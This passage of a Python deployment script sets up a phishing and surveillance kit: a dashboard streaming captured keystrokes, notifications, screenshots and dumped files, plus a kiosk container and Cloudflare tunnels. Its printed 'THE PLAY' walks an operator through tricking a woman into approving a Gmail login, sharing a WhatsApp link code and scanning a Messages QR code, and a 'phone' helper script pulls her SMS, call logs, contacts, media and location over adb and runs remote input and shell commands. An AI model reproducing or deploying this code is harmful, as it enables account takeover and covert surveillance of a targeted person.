        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        if body:
            self.wfile.write(body)

    def _file(self, path, ctype):
        try:
            data = path.read_bytes()
        except OSError:
            return self._send(404, b"nope\n")
        self._send(200, data, ctype)

    def _tail(self, path, n=400):
        try:
            with open(path, "rb") as f:
                f.seek(0, 2); size = f.tell(); f.seek(max(0, size - 400000))
                return f.read().decode("utf-8", "replace").splitlines()[-n:]
        except OSError:
            return []

    def do_GET(self):
        if not self._auth():
            return self._401()
        u = urllib.parse.urlparse(self.path)
        p, q = u.path, urllib.parse.parse_qs(u.query)

        if p == "/":
            return self._send(200, PAGE.replace("KIOSK", KIOSK)
                              .replace("TERM", TERM).encode(),
                              "text/html; charset=utf-8")

        if p == "/api/log":
            try:
                size = KEYS.stat().st_size
            except OSError:
                size = 0
            try:
                since = max(0, int(q.get("since", ["0"])[0]))
            except ValueError:
                since = 0
            reset = since > size
            start = 0 if reset else since
            data = b""
            if size > start:
                with open(KEYS, "rb") as f:
                    f.seek(start)
                    data = f.read(262144)
                if data and not data.endswith(b"\n"):
                    i = data.rfind(b"\n")
                    if i >= 0:
                        data = data[:i + 1]; size = start + len(data)
                    else:
                        data, size = b"", start
            return self._send(200, json.dumps({
                "size": size, "reset": reset,
                "lines": data.decode("utf-8", "replace").splitlines()}).encode(),
                "application/json")

        if p == "/api/notif":
            return self._send(200, ("\n".join(self._tail(NOTIF, 200)) + "\n").encode())
        if p == "/api/info":
            return self._send(200, ("\n".join(self._tail(INFO, 60)) + "\n").encode())

        if p == "/api/stat":
            try:
                keys = sum(1 for _ in open(KEYS, encoding="utf-8", errors="ignore"))
            except OSError:
                keys = 0
            files = size = 0
            for root, _, fs in os.walk(ROOT):
                for fn in fs:
                    files += 1
                    try:
                        size += (Path(root) / fn).stat().st_size
                    except OSError:
                        pass
            return self._send(200, json.dumps({
                "keys": keys, "files": files,
                "size": "%.1f MB" % (size / 1048576.0)}).encode(),
                "application/json")

        if p == "/screen.png":
            return self._file(ROOT / "screen.png", "image/png")
        if p == "/kiosk.png":
            return self._file(ROOT / "kiosk.png", "image/png")
        if p == "/qr.png":
            return self._file(ROOT / "qr.png", "image/png")

        if p.startswith("/f/"):
            rel = urllib.parse.unquote(p[3:])
            target = (ROOT / rel).resolve()
            if not str(target).startswith(str(ROOT.resolve())):
                return self._send(403, b"forbidden\n")
            if target.is_dir():
                rows = ['<meta charset=utf-8><body style="background:#0b0d10;'
                        'color:#d7dae0;font:13px ui-monospace,monospace;padding:16px">']
                rows.append('<a style="color:#7ee787" href="/f/">/</a><hr>')
                for child in sorted(target.iterdir()):
                    name = child.name + ("/" if child.is_dir() else "")
                    rows.append('<a style="color:#d7dae0;text-decoration:none" href="/f/%s">%s</a><br>'
                                % (urllib.parse.quote(str(Path(rel) / child.name)), name))
                return self._send(200, "".join(rows).encode(), "text/html; charset=utf-8")
            ctype = mimetypes.guess_type(str(target))[0] or "application/octet-stream"
            return self._file(target, ctype)

        self._send(404, b"nope\n")

ThreadingHTTPServer(("0.0.0.0", PORT), H).serve_forever()
'''

DPATH = BASE / "dash.py"
DPATH.write_text(DASH)
os.chmod(str(DPATH), 0o755)
kill_pidfile("dash")
denv = dict(os.environ, DUMP=str(DUMP), KEYS=str(KEYS), NOTIF=str(NOTIF),
            INFO=str(INFO), DASH_TOKEN=PW["DASH_TOKEN"], DASHPORT=str(DASHPORT),
            KIOSK_URL=URLS.get("kiosk", ""), TERM_URL=URLS.get("term", ""))
spawn([sys.executable, str(DPATH)], logfile=BASE / "dash.out",
      name="dash", env=denv)
time.sleep(1.0)
dcode = http_code("http://127.0.0.1:%d/" % DASHPORT,
                  auth="god:" + PW["DASH_TOKEN"])
ok("dashboard :%d" % DASHPORT) if dcode else bad("dashboard")

# =================================================================== self-test

say("self-test")
FAIL = 0

if http_code("http://127.0.0.1:%d/health" % KEYPORT) == 200:
    ok("collector alive")
else:
    bad("collector dead"); FAIL = 1

running = False
for _ in range(40):
    r = subprocess.run(["docker", "inspect", "-f", "{{.State.Running}}", "ff-kiosk"],
                       capture_output=True, text=True)
    if r.stdout.strip() == "true":
        running = True; break
    time.sleep(1)
ok("kiosk running") if running else bad("kiosk not running")

probe = ('exec 3<>/dev/tcp/host.docker.internal/8099 || exit 1\n'
         'printf "GET /health HTTP/1.0\\r\\n\\r\\n" >&3\nhead -1 <&3')
r = subprocess.run(["docker", "exec", "ff-kiosk", "bash", "-c", probe],
                   capture_output=True, text=True)
ok("kiosk -> collector reachable") if "200" in r.stdout \
    else bad("kiosk cannot reach collector")

code = 0
for _ in range(40):
    code = http_code("http://127.0.0.1:%d/" % VNC_PORT)
    if code: break
    time.sleep(2)
ok("kiosk vnc :%d -> %s" % (VNC_PORT, code)) if code else bad("kiosk vnc dead")

ok("dashboard auth") if dcode else bad("dashboard auth")

http_post("http://127.0.0.1:%d/k" % KEYPORT, {"text": "[PREFLIGHT]"})
time.sleep(0.4)
ok("collector writes keys.log") if KEYS.exists() and "PREFLIGHT" in KEYS.read_text(errors="ignore") \
    else bad("collector not writing")

if phone_connected():
    ok("phone online")
else:
    FAIL = 1

# ==================================================================== summary

say("up")
du_ = URLS.get("dash") or "http://localhost:%d" % DASHPORT
dash_auth = du_.replace("https://", "https://god:%s@" % PW["DASH_TOKEN"]) \
    if du_.startswith("https://") else du_

print("  \033[1mDASHBOARD\033[0m  %s" % dash_auth)
print("             user god   pw %s" % PW["DASH_TOKEN"])
print()
print("  kiosk      %s" % (URLS.get("kiosk") or "http://localhost:%d" % VNC_PORT))
print("             vnc pw %s" % PW["PW_VNC"])
print("  shell      %s" % (URLS.get("term") or "http://localhost:%d" % TERMPORT))
print("             user %s pw %s" % (os.environ.get("USER", "root"), PW["PW_TERM"]))
print()
print("  keys       %s" % KEYS)
print("  dump       %s" % DUMP)
print("  helpers    gm-down · phone · qr · gm-restart")
print()
print("  \033[1mTHE PLAY\033[0m")
print("   1. log into gmail in the kiosk   -> email + 'was this you?' prompt")
print("   2. whatsapp tab -> 'link with phone number' -> dm the 8-digit code")
print("   3. messages tab -> qr -> dm the image -> she scans")
print("   all three inside 5 minutes. watch the dashboard.")
print()
if not phone_connected():
    print("  \033[33mPHONE NOT CONNECTED\033[0m - one time on the phone:")
    print("    Settings > About > tap Build number 7x")
    print("    Developer options > Wireless debugging > ON")
    print("    'Pair device with pairing code' -> note ip:port + code")
    print("      adb pair <ip>:<pair-port>")
    print("      adb connect <ip>:<debug-port>")
    print("      gm-restart")
    print()
print("  \033[32mREADY\033[0m" if FAIL == 0 else "  \033[31mCHECK !! ABOVE\033[0m")

# ==================================================================== helpers

PHONE_CLI = """#!/usr/bin/env bash
D=__BASE__/dump
mkdir -p "$D"
case "$1" in
  help)
    cat <<'H'
phone help                 this
phone info                 refresh device snapshot
phone notif [n]            recent notifications
phone shot [name]          screenshot -> dump/
phone live                 toggle live feed
phone pull                 photos, video, whatsapp media, sms, calls, contacts
phone sms | calls | contacts
phone apps                 installed 3rd-party packages
phone files [path]         list a directory
phone loc                  last known location
phone text "hello"         type on the phone
phone tap X Y              tap
phone swipe X1 Y1 X2 Y2    swipe
phone key BACK|HOME|ENTER  keyevent
phone open URL             open a url on the phone
phone rec [secs]           screen record and pull
phone shell CMD            raw adb shell
phone devices              list devices
H
    ;;
  info) adb shell 'getprop ro.product.model; getprop ro.build.version.release;
        dumpsys battery | grep -m1 level; wm size; df -h /sdcard | tail -1' ;;
  notif) tail -n "${2:-50}" "$D/notifications.txt" 2>/dev/null ;;
  shot) adb exec-out screencap -p > "$D/${2:-shot}-$(date +%H%M%S).png";
        ls -1t "$D"/*.png 2>/dev/null | head -1 ;;
  live) if [ -f __BASE__/pids/screen.pid ]; then
          kill "$(cat __BASE__/pids/screen.pid)" 2>/dev/null;
          rm -f __BASE__/pids/screen.pid; echo "live off";
        else
          nohup python3 __BASE__/screen_sup.py "$D/screen.png" >/dev/null 2>&1 &
          echo $! > __BASE__/pids/screen.pid; echo "live on"; fi ;;
  pull) python3 __BASE__/puller.py "$D" 1 "__DIRS__" once >/dev/null 2>&1; du -sh "$D" ;;
  sms) adb shell content query --uri content://sms > "$D/sms.txt";
       echo "$(grep -c 'Row:' "$D/sms.txt") rows" ;;
  calls) adb shell content query --uri content://call_log/calls > "$D/call_log.txt";
         echo "$(grep -c 'Row:' "$D/call_log.txt") rows" ;;
  contacts) adb shell content query --uri content://contacts/phones > "$D/contacts.txt";
            echo "$(grep -c 'Row:' "$D/contacts.txt") rows" ;;
  apps) adb shell pm list packages -3 | sed 's/package://' | sort ;;
  files) adb shell ls -la "${2:-/sdcard}" ;;
  loc) adb shell dumpsys location | grep -m3 -i 'last location\\|Location\\[' ;;
  text) adb shell input text "$(echo "$2" | sed 's/ /%s/g')" ;;
  tap) adb shell input tap "$2" "$3" ;;
  swipe) adb shell input swipe "$2" "$3" "$4" "$5" "${6:-300}" ;;
  key) adb shell input keyevent "$2" ;;
  open) adb shell am start -a android.intent.action.VIEW -d "$2" ;;
  rec) adb shell screenrecord --time-limit "${2:-10}" /sdcard/rec.mp4;
       adb pull /sdcard/rec.mp4 "$D/rec-$(date +%H%M%S).mp4" ;;
  shell) shift; adb shell "$@" ;;
  devices) adb devices -l ;;
  *) adb "$@" ;;
esac
"""

QRCLI = """#!/usr/bin/env bash
D=__BASE__/dump
cat "$D/qr.txt" 2>/dev/null || echo "no qr captured - switch the kiosk to the tab"
echo
echo "image: $D/qr.png"
"""

SCREEN_SUP = r'''#!/usr/bin/env python3
import subprocess, sys, time
out = sys.argv[1]
while True:
    try:
        with open(out, "wb") as f:
            subprocess.run(["adb", "exec-out", "screencap", "-p"], stdout=f, timeout=30)
    except Exception:
        pass
    time.sleep(4)
'''

GMDOWN = (
    "#!/usr/bin/env bash\n"
    "docker rm -f ff-kiosk >/dev/null 2>&1\n"
    "for f in " + str(PIDDIR) + "/*.pid; do\n"
    '  [ -f "$f" ] && kill "$(cat "$f")" 2>/dev/null\n'
    '  rm -f "$f"\n'
    "done\n"
    "pkill -f 'cloudflared tunnel --url' >/dev/null 2>&1\n"
    "pkill -f 'tunnel_sup.py' >/dev/null 2>&1\n"
    "systemctl stop cloudflared >/dev/null 2>&1\n"
    "echo down\n"
)

GMRESTART = (
    "#!/usr/bin/env bash\n"
    'exec "%s" "%s" "$@"\n' % (sys.executable, SELF)
)

PHONE_CLI = PHONE_CLI.replace("__DIRS__", "|".join(PHONE_DIRS)) \
                     .replace("__BASE__", str(BASE))
QRCLI = QRCLI.replace("__BASE__", str(BASE))

write_helper("phone", PHONE_CLI)
write_helper("qr", QRCLI)
write_helper("gm-down", GMDOWN)
write_helper("gm-restart", GMRESTART)

p = BASE / "screen_sup.py"
p.write_text(SCREEN_SUP)
os.chmod(str(p), 0o755)

print("  helper     gm-down · phone · qr · gm-restart")
sys.exit(0)